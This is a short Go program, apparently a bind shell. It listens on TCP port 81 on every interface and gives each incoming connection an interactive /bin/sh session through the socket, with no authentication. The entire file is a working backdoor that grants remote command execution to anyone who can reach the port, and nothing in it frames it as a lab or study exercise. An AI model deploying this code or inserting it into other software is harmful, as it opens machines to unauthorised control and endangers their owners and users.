package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
)

const port = 81

type Flusher struct {
	w *bufio.Writer
}

func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

func (f *Flusher) Write(b []byte) (int, error) {
	count, err := f.w.Write(b)
	if err != nil {
		return -1, err
	}

	if err := f.w.Flush(); err != nil {
		return -1, err
	}

	return count, err
}

func handle(conn net.Conn) {
	cmd := exec.Command("/bin/sh", "-i")
	cmd.Stdin = conn
	cmd.Stdout = NewFlusher(conn)

	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}
}

func main() {
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		log.Fatalln("Unable to bind to port")
	}

	log.Println(fmt.Sprintf("Listening on 0.0.0.0:%d", port))

	for {
		conn, err := listener.Accept()
		log.Println("Received connection")
		if err != nil {
			log.Fatalln("Unable to accept connection")
		}

		go handle(conn)
	}
}
